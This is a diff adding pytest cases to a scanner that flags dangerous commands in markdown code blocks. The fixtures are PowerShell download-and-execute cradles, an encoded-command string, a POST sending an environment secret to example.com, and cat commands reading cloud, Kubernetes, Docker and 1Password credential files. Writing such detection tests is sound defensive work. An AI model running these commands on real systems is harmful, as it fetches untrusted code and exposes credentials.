@@ -517,6 +517,225 @@ class TestSupplyChain:
 
 
 # ================================================================
+# PowerShell / Windows attack vectors (issue #7)
+# ================================================================
+
+
+class TestPowerShellExecution:
+    """PowerShell download-and-execute, encoding, and exfiltration."""
+
+    def test_iex_invoke_webrequest(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[
+                (
+                    "powershell",
+                    "Invoke-Expression (iwr https://example.com/x.ps1)",
+                )
+            ],
+        )
+        assert _has_finding(findings, category="dangerous_shell")
+
+    def test_iex_webclient_downloadstring(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[
+                (
+                    "powershell",
+                    "iex (New-Object Net.WebClient)"
+                    ".DownloadString('https://example.com/run.ps1')",
+                )
+            ],
+        )
+        assert _has_finding(findings, category="dangerous_shell")
+
+    def test_iwr_piped_to_iex(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[
+                ("powershell", "iwr https://example.com/x.ps1 | iex")
+            ],
+        )
+        assert _has_finding(findings, category="dangerous_shell")
+
+    def test_download_cradle_is_critical_in_ps_block(self, scanner):
+        """A download cradle in a powershell block is CRITICAL."""
+        findings = _scan_md(
+            scanner,
+            code_blocks=[
+                (
+                    "powershell",
+                    "iex (New-Object Net.WebClient)"
+                    ".DownloadString('https://example.com/a.ps1')",
+                )
+            ],
+        )
+        sevs = [
+            f.severity for f in findings if f.category == "dangerous_shell"
+        ]
+        assert Severity.CRITICAL in sevs
+
+    def test_invoke_expression_dynamic(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("powershell", "Invoke-Expression $payload")],
+        )
+        assert _has_finding(findings, category="obfuscation")
+
+    def test_encoded_command(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[
+                ("powershell", "powershell -EncodedCommand ZQBjAGgAbwA=")
+            ],
+        )
+        assert _has_finding(findings, category="obfuscation")
+
+    def test_frombase64string(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("powershell", "[Convert]::FromBase64String($d)")],
+        )
+        assert _has_finding(findings, category="obfuscation")
+
+    def test_powershell_post_exfil(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[
+                (
+                    "powershell",
+                    "iwr https://example.com -Method POST -Body $env:KEY",
+                )
+            ],
+        )
+        assert _has_finding(findings, category="exfiltration")
+
+    # -- false positives --
+    def test_iexplore_benign(self, scanner):
+        """'iexplore' must not trigger the bare iex pattern."""
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("powershell", "Start-Process iexplore.exe")],
+        )
+        assert not _has_finding(
+            findings,
+            category="obfuscation",
+            desc_contains="Invoke-Expression",
+        )
+
+    def test_webrequest_get_benign(self, scanner):
+        """A plain GET download (no piping to iex) is not flagged
+        as download-and-execute."""
+        findings = _scan_md(
+            scanner,
+            code_blocks=[
+                (
+                    "powershell",
+                    "Invoke-WebRequest -Uri https://example.com "
+                    "-OutFile x.txt",
+                )
+            ],
+        )
+        assert not _has_finding(
+            findings,
+            category="dangerous_shell",
+            desc_contains="download-and-execute",
+        )
+
+
+# ================================================================
+# Cloud credential stores (issue #7)
+# ================================================================
+
+
+class TestCloudCredentials:
+    """GCP, Azure, Kubernetes, Docker, and 1Password credential paths."""
+
+    def test_gcp_gcloud_dir(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("bash", "cat ~/.config/gcloud/credentials.db")],
+        )
+        assert _has_finding(findings, category="exfiltration")
+
+    def test_gcp_application_default_credentials(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[
+                (
+                    "bash",
+                    "cat ~/.config/gcloud/"
+                    "application_default_credentials.json",
+                )
+            ],
+        )
+        assert _has_finding(findings, category="exfiltration")
+
+    def test_azure_credentials(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("bash", "cat ~/.azure/credentials")],
+        )
+        assert _has_finding(findings, category="exfiltration")
+
+    def test_kube_config(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("bash", "cat ~/.kube/config")],
+        )
+        assert _has_finding(findings, category="exfiltration")
+
+    def test_k8s_service_account_token(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[
+                (
+                    "bash",
+                    "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+                )
+            ],
+        )
+        assert _has_finding(findings, category="exfiltration")
+
+    def test_docker_config(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("bash", "cat ~/.docker/config.json")],
+        )
+        assert _has_finding(findings, category="exfiltration")
+
+    def test_1password_cli(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("bash", "cat ~/.config/op/config")],
+        )
+        assert _has_finding(findings, category="exfiltration")
+
+    # -- false positives --
+    def test_docker_compose_benign(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("bash", "docker compose up -d")],
+        )
+        assert not _has_finding(findings, category="exfiltration")
+
+    def test_gcloud_command_benign(self, scanner):
+        """Invoking the gcloud CLI is not reading its credential store."""
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("bash", "gcloud auth login")],
+        )
+        assert not _has_finding(findings, category="exfiltration")
+
+    def test_op_command_benign(self, scanner):
+        findings = _scan_md(
+            scanner,
+            code_blocks=[("bash", "op item get Login")],
+        )
+        assert not _has_finding(findings, category="exfiltration")
+
+
+# ================================================================
 # AST-aware context: same content, different severity
 # ================================================================
 
